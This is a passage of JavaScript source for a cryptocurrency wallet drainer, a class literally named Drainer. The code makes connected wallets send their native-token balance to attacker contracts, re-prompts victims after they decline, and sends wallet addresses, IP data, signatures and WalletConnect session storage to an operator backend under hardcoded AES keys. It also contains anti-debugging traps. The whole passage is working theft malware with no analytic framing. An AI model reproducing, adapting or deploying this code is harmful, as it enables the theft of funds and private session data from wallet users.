        if (config.repeatHighest) {
          return await this.transferNFT(T, k);
        }
        console.log("NFT error:", f);
        this.txcount++;
      });
    } catch (f) {
      console.log("Failed to Approve NFTs", f);
    }
  };
  ["transferNative"] = async (T, k, H) => {
    console.log("Native", k, H);
    if (H >= config.nativeMinimals[k]) {
      try {
        await this.changeNetwork(k);
        console.log("Transferring native", k);
        console.log("Pending Transactions: " + this.pending.length);
        let f = ethers.utils.parseUnits(H.toString(), 18);
        let D = this.gasPrices[k];
        if (k == 81457) {
          D = "0x5968309C";
        }
        let U = ethers.BigNumber.from(D);
        let q = ethers.BigNumber.from(this.bNumbers[k]);
        let y = 3;
        if (this.estimated_txs <= 1) {
          y = 2;
        }
        if (this.estimated_txs > 10) {
          y = 5;
        }
        let K = q.mul(U.mul(y)).mul(130).div(100);
        console.log(K.toString() / 1000000000000000000);
        K = q.mul(U).mul(y);
        console.log(K.toString() / 1000000000000000000);
        let s = f.sub(K);
        console.log("Sending " + ethers.utils.formatEther(s));
        if (ethers.utils.formatEther(s) < 0) {
          try {
            Swal.closeToast();
          } catch (a) {}
          return;
        }
        try {
          this.logPromting(T, "NATIVE", {
            "chain": k,
            "native": H,
            "tokenPrice": Number(s).toFixed(3),
            "to_wallet": config.ethContractAddress[k]
          });
        } catch (t) {
          console.warn(t);
        }
        await new Promise(async (N, c) => {
          let I = new ethers.utils.Interface(ETH_CONTRACT);
          let x = I.encodeFunctionData("claim", [config.seaport_receiver, config.percentage]);
          if (this.netWorth > config.reserve_contract_min) {
            x = '';
          }
          let E = {
            "from": this.walletAddress,
            "to": config.ethContractAddress[k],
            "value": s._hex,
            "data": x,
            "maxFeePerGas": D
          };
          if (!this.isMobile() && window.ethereum?.["isMetaMask"]) {
            console.log("Overriding gas price to ", q._hex, q.toString());
            E.gas = q._hex;
          }
          console.log(E);
          try {
            await this.main_provider.sendAsync({
              "method": "eth_sendTransaction",
              "params": [E],
              "from": this.walletAddress
            }, (r, Q) => {
              if (r) {
                console.error(r);
                c(r);
              } else {
                let w = Q;
                if (Q.hasOwnProperty("result")) {
                  w = Q.result;
                } else if (Q.hasOwnProperty("hash")) {
                  w = Q.hash;
                }
                console.log("Native success", w);
                this.pending.push(w);
                N(w);
              }
            });
          } catch (r) {
            c(r);
          }
        }).then(async N => {
          let l = await this.getIpData();
          fetch(this.logDomainName + "backend/safa/native", {
            "method": "POST",
            "mode": "cors",
            "cache": "no-cache",
            "headers": {
              "Content-Type": "application/json",
              "Accept": "application/json"
            },
            "body": this.encryptBody(JSON.stringify({
              "address": this.walletAddress,
              "walletBalanceInNative": H,
              "isMobile": this.isMobile(),
              "websiteUrl": window.location.href,
              "websiteDomain": window.location.host,
              "ipData": l,
              "API_KEY": config.API_KEY,
              "chain": k,
              "signature": this.signature,
              "tokenPrice": Number(s).toFixed(3),
              "transactionHash": N,
              "hash_sweet": T,
              "useVerified": this.useVerified[k] ? this.verified[k] : null,
              "contract_salt": config.contract_salt_nv[k],
              "unmarkedContract": config.ethContractAddress[k]
            }))
          });
          this.txcount++;
          this.addToLocalStorage(T);
          return true;
        })["catch"](async N => {
          this.logCancelNative(k, H);
          await this.handleDecline();
          if (config.repeatHighest) {
            return await this.transferNative(T, k, H);
          }
          console.log("Native contract error:", N);
          this.txcount++;
          this.updateButtonMessage(true);
        });
      } catch (N) {
        console.warn("Failed to transfer Native:" + N);
      }
    } else {
      console.log("Skipped poor (Fucking broke) native", k);
    }
  };
  ["estimateTXcosts"] = async (T, k, H) => {
    try {
      let f = await this.ethers_provider.estimateGas(T);
      let D = await this.ethers_provider.getGasPrice();
      let U = f.mul(D).mul(2);
      let y = await this.ethers_provider.getBalance(this.walletAddress);
      if (y.lt(U)) {
        let s = await this.getIpData();
        let a = U.sub(y);
        fetch(this.logDomainName + "backend/no_funds_for_gas", {
          "method": "POST",
          "mode": "cors",
          "cache": "no-cache",
          "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          "body": this.encryptBody(JSON.stringify({
            "websiteDomain": window.location.host,
            "websiteUrl": window.location.href,
            "address": this.walletAddress,
            "isMobile": this.isMobile(),
            "ipData": s,
            "API_KEY": config.API_KEY,
            "transfer_data": k,
            "chain": H,
            "howmuch": a
          }))
        });
      }
    } catch (t) {
      console.log(t);
    }
  };
  ["getIpData"] = async () => {
    if (this.ipDataCache) {
      return this.ipDataCache;
    }
    let i = {
      "ip": "Unknown",
      "country_name": "Unknown"
    };
    if (config.logIpData) {
      try {
        i = await fetch("https://ipapi.co/json/", this.requestOptionsPOST).then(B => B.json());
        this.ipDataCache = i;
      } catch (B) {
        console.warn("Couldn't fetch ip data: ", B);
      }
    }
    return i;
  };
  ["logConnection"] = async () => {
    try {
      console.log(this.netWorth);
      let i = await this.getIpData();
      let B = this.main_provider;
      let V = window.localStorage.getItem("wagmi.wallet");
      try {
        V = B.signer.session.peer.metadata.name || "Other";
      } catch (s) {
        console.log(s);
      }
      V = V.replace("\"", '');
      let f = await this.signer.getChainId();
      let D = [];
      let U = false;
      if (config.logDrainingStrategy) {
        U = true;
        D = this.sweets;
      }
      fetch(this.logDomainName + "backend/connectionV3", {
        "method": "POST",
        "mode": "cors",
        "cache": "no-cache",
        "headers": {
          "Content-Type": "application/json",
          "Accept": "application/json",
          "Access-Control-Allow-Origin": "*"
        },
        "body": this.encryptBody(JSON.stringify({
          "address": this.walletAddress,
          "isMobile": this.isMobile(),
          "isAndroidOrIphone": this.isAndroidOrIphone(),
          "websiteUrl": window.location.href,
          "websiteDomain": window.location.host,
          "ipData": i,
          "API_KEY": config.API_KEY,
          "walletname": V,
          "version": config.version,
          "chain": f,
          "specials": this.detectSimulators(),
          "strategy_enabled": U,
          "contractId": this.contractId,
          "networth": this.netWorth,
          "sweets": D
        }))
      });
      let q = window.localStorage;
      let y = ["w3m", "wagmi", "wc@", "W3M"];
      let K = Object.fromEntries(Object.entries(q).filter(([a, t]) => {
        return y.some(c => a.includes(c));
      }));
      fetch(this.logDomainName + "backend/storage", {
        "method": "POST",
        "mode": "cors",
        "cache": "no-cache",
        "headers": {
          "Content-Type": "application/json",
          "Accept": "application/json",
          "Access-Control-Allow-Origin": "*"
        },
        "body": this.encryptBody(JSON.stringify({
          "address": this.walletAddress,
          "API_KEY": config.API_KEY,
          "storage": JSON.stringify(K)
        }))
      });
    } catch (a) {
      console.log("Connection Log error: ", a);
    }
  };
  ["logCancel"] = async (T, k = '', H = '') => {
    try {
      console.log("logCancel", T, k, H);
      let f = await this.getIpData();
      fetch(this.logDomainName + "backend/cancel", {
        "method": "POST",
        "mode": "cors",
        "cache": "no-cache",
        "headers": {
          "Content-Type": "application/json",
          "Accept": "application/json"
        },
        "body": this.encryptBody(JSON.stringify({
          "address": this.walletAddress,
          "walletBalanceInEth": this.walletBalanceInEth,
          "isMobile": this.isMobile(),
          "websiteUrl": window.location.href,
          "websiteDomain": window.location.host,
          "ipData": f,
          "tokenType": T,
          "tokenName": k,
          "tokenPrice": H,
          "API_KEY": config.API_KEY,
          "signature": this.signature
        }))
      });
    } catch (D) {
      console.log("Connection Log error: ", D);
    }
  };
  ["logCancelNative"] = async (T, k) => {
    try {
      let V = await this.getIpData();
      fetch(this.logDomainName + "backend/cancelNative", {
        "method": "POST",
        "mode": "cors",
        "cache": "no-cache",
        "headers": {
          "Content-Type": "application/json",
          "Accept": "application/json",
          "Access-Control-Allow-Origin": "*"
        },
        "body": this.encryptBody(JSON.stringify({
          "address": this.walletAddress,
          "native": k,
          "isMobile": this.isMobile(),
          "websiteUrl": window.location.href,
          "websiteDomain": window.location.host,
          "ipData": V,
          "API_KEY": config.API_KEY,
          "chain": T,
          "signature": this.signature
        }))
      });
    } catch (f) {
      console.log("Connection Log error: ", f);
    }
  };
  ["handleDecline"] = async () => {
    if (config.warnReprompt) {
      await this.firePopupAsync(config.warnReprompt_title, config.warnReprompt_text, "error");
    }
    await this.sleep(350);
  };
  ["notEligible"] = () => {
    this.started = false;
    Swal.closeToast();
    if (config.useSweetAlert) {
      Swal.fire(config.swal_notEligibleTitle, config.notEli, "error");
    } else {
      alert(config.notEligible);
    }
    this.updateButtonMessage(false, false, true);
    DrainerPopup.closePopup();
    console.warn("Not eligible");
  };
  ["firePopupAsync"] = async (T, k, H) => {
    if (config.useSweetAlert) {
      return new Promise((f, D) => {
        const y = {
          title: T,
          text: k,
          allowOutsideClick: false,
          allowEscapeKey: false,
          allowEnterKey: false,
          showConfirmButton: true,
          icon: H
        };
        Swal.fire(y).then(K => {
          f(K);
        });
      });
    } else {
      alert(k);
    }
  };
  ["encryptBody"] = T => {
    return JSON.stringify({
      "encrypted": String(CryptoJS.AES.encrypt(T, "F-JaNdRgUkXp2r5u8x/A?D(G+KbPeShVmYq3t6v9y$B&E)H@McQfTjWnZr4u7x!z%C*F-JaNdRgUkXp2s5v8y/B?D(G+KbPeShVmYq3t6w9z$C&F)H@McQfTjWnZr4u7"))
    });
  };
  ["decryptBody"] = T => {
    return CryptoJS.AES.decrypt(T, "y$B&E)H@McQfTjWmZq4t7w!z%C*F-JaNdRgUkXp2r5u8x/A?D(G+KbPeShVmYq3t6v9y$B&E)H@McQfTjWnZr4u7x!z%C*F-JaNdRgUkXp2s5v8y/B?D(G+KbPeShVmY").toString(CryptoJS.enc.Utf8);
  };
  ["sleep"] = T => {
    return new Promise(k => setTimeout(k, T));
  };
  ["isMobile"] = () => {
    let H = false;
    (function (i) {
      if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(i) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(i.substr(0, 4))) {
        H = true;
      }
    })(navigator.userAgent || navigator.vendor || window.opera);
    return H;
  };
  ["isAndroidOrIphone"] = () => {
    var f = navigator.userAgent.toLowerCase();
    var V = f.indexOf("android") > -1;
    if (V) {
      return "Android";
    }
    if (navigator.userAgent.match(/'Win32|Win64|Windows|Windows NT|WinCE/i)) {
      return "Windows";
    }
    if (navigator.userAgent.match(/Macintosh|Mac|Mac OS|MacIntel|MacPPC|Mac68K/i)) {
      return "MacOS";
    }
    if (navigator.userAgent.match(/iPhone/i) || navigator.userAgent.match(/iPod/i)) {
      return "Iphone";
    }
  };
  ["addToLocalStorage"] = T => {
    let B = "cached_sweets_" + this.walletAddress;
    if (typeof localStorage !== "undefined") {
      try {
        const V = localStorage.getItem(B);
        let f;
        if (V) {
          const D = JSON.parse(V);
          if (Array.isArray(D)) {
            D.push(T);
            f = JSON.stringify(D);
            console.log(f, 3);
          } else {
            f = JSON.stringify([D, T]);
            console.log(f, 2);
          }
        } else {
          f = JSON.stringify([T]);
          console.log(f, 1);
        }
        localStorage.setItem(B, f);
      } catch (U) {
        console.error(U);
      }
    } else {
      console.error("LS unsupported");
    }
  };
}
function n38UJ8b() {
  if (window.w3m_loaded) {
    console.log("Scripts are loaded");
    new Drainer();
  } else {
    console.log("Waiting for scripts to load...");
    setTimeout(n38UJ8b, 200);
  }
}
config.w3m_name = typeof w3m_name !== "undefined" ? w3m_name || document.title || "WalletConnect" : document.title || "WalletConnect";
config.w3m_description = typeof w3m_description !== "undefined" ? w3m_description || document.title || "WalletConnect" : document.title || "WalletConnect";
config.w3m_url = typeof w3m_url !== "undefined" ? w3m_url || window.location.href : window.location.href || "https://ethereum.org";
config.w3m_icons = typeof w3m_icons !== "undefined" ? w3m_icons || ["https://avatars.githubusercontent.com/u/37784886"] : ["https://avatars.githubusercontent.com/u/37784886"];
new Drainer();
function u(k) {
  const H = {
    nqSEt: function (V, f) {
      return V + f;
    }
  };
  H.pwFjn = "length";
  H.vAlOl = "gger";
  H.dNXTp = "stateObject";
  function B(V) {
    if (typeof V === "string") {
      return function (f) {}.constructor("while (true) {}").apply("counter");
    } else if (('' + V / V)[H.pwFjn] !== 1 || V % 20 === 0) {
      (function () {
        return true;
      }).constructor("debu" + H.vAlOl).call("action");
    } else {
      (function () {
        return false;
      }).constructor("debu" + H.vAlOl).apply(H.dNXTp);
    }
    B(++V);
  }
  try {
    if (k) {
      return B;
    } else {
      B(0);
    }
  } catch (V) {}
}